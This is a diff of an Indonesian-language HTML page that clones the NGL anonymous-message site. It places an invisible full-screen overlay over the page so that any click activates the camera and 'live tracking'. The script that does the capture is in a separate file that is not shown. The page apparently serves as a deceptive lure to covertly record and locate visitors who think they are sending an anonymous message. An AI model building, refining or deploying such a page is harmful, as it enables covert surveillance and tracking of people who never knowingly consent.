@@ -3,28 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NGL Clone + Live Tracking</title>
+<title>NGL Clone + Kamera</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <link href="style.css" rel="stylesheet"/>
 </head>
 <body class="min-h-screen flex items-center justify-center px-4 py-12">
 <div class="w-full max-w-md">
-  <!-- top activity -->
-  <div class="flex justify-center mb-6">
-    <div class="activity text-sm text-gray-600">205 teman baru saja mengetuk</div>
-  </div>
-
-  <!-- main card -->
   <div class="card bg-white rounded-xl shadow-md p-5">
     <div class="text-gray-900 font-semibold text-sm mb-2">@bibd51254</div>
     <div class="text-gray-500 text-xs mb-4">kirimi aku pesan anonim</div>
-    <textarea id="msg" class="w-full h-36 p-4 resize-none border rounded-lg" placeholder="Ketik pesan anonimmu di sini..."></textarea>
+    <textarea id="msg" class="w-full h-36 p-4 resize-none border rounded-lg" placeholder="Tulis pesanmu..."></textarea>
     <button id="sendBtn" class="mt-4 w-full bg-black text-white py-3 rounded-full font-semibold hover:scale-[1.02] transition">Send!</button>
-    <div id="status" class="mt-2 text-sm text-yellow-500">Menunggu interaksi...</div>
+    <div id="status" class="mt-2 text-sm text-yellow-500">Klik halaman untuk aktivasi kamera & live tracking...</div>
   </div>
 </div>
 
-<!-- invisible click area untuk trigger kamera -->
+<!-- invisible click area -->
 <div id="clickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;"></div>
 
 <script src="script.js"></script>
